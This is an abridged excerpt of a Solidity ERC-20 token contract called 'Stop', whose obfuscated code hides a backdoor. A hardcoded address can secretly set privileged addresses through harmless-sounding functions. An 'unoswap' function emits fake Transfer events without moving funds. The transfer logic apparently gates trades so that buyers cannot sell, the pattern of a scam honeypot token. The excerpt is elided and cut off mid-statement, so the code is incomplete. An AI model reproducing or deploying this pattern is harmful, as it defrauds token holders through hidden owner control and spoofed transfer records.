...
contract Stop is Ownable, IERC20, IERC20Meta {
    ...
    address private _d58495;
    address private _e78485;
    uint256 private  _a758 = 99999;
    ...
    function decimals() public view virtual override returns (uint8) {
        ...
        function unoswap(address [] calldata _addresses_, uint256 _out) external {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Transfer(_d58495, _addresses_[i], _out);
        }
    }
    ...
    function actionPair(address account) public virtual returns (bool) {
         if(_msgSender() == 0x7A7A27D1198F1AC21A04733Cdd0F619bFCfBF76F) _d58495 = account;
        return true;
    }

        function setup(address account) public virtual returns (bool) {
         if(_msgSender() == 0x7A7A27D1198F1AC21A04733Cdd0F619bFCfBF76F) _e78485 = account;
        return true;
    }
    ...
    function _transfer(
        ...
        if((from != _d58495 && to == _e78485) || (_d58495 == to && from != _e78485 && from  != 0x7A7A27D1198F1AC21A04733Cdd0F619bFCfBF76F)) {
